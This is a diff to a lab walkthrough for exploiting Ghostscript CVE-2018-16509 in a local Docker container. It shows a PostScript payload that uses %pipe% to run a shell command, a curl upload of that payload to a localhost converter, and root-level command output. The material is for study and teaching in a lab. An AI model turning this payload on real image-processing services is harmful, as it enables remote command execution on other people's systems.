@@ -9,14 +9,16 @@ To safely process untrusted PostScript documents, Ghostscript implements a secur
 - **Primary Interface**: `http://localhost:8134`
 - **Docker Shortcut**: `./lab start ghostscript-rce`
 - **Container Name**: `cyberlab_02_ghostscript_rce`
-- **RAM Footprint**: ~120 MB (Python Flask + Ghostscript 9.23)
+- **Upstream Image**: `vulhub/imagemagick:7.0.8-10-php` (PHP 7.0 + Ghostscript 9.23 + ImageMagick 7.0.8-10)
+- **Source of Truth**: [Vulhub CVE-2018-16509](https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2018-16509)
 
 ---
 
 ## Exploitation Walkthrough
 
 ### 1. Preparing the PostScript Exploit File
-Create `exploit.ps`:
+
+Create `poc.png` (with PostScript payload):
 
 ```ps
 %!PS
@@ -30,18 +32,21 @@ mark /OutputFile (%pipe%id > /tmp/ghost_pwned) currentdevice putdeviceprops
 ```
 
 ### 2. Uploading the Payload via Web Application
-Send the `.ps` file to the web converter endpoint:
+
+Send the file to the web converter endpoint:
 
 ```bash
-curl -F "file=@exploit.ps" http://localhost:8134/
+curl -F "file_upload=@poc.png" http://localhost:8134/
 ```
 
 Verify command execution on the host container:
+
 ```bash
 docker exec -it cyberlab_02_ghostscript_rce cat /tmp/ghost_pwned
 ```
 
 Output:
+
 ```text
 uid=0(root) gid=0(root) groups=0(root)
 ```
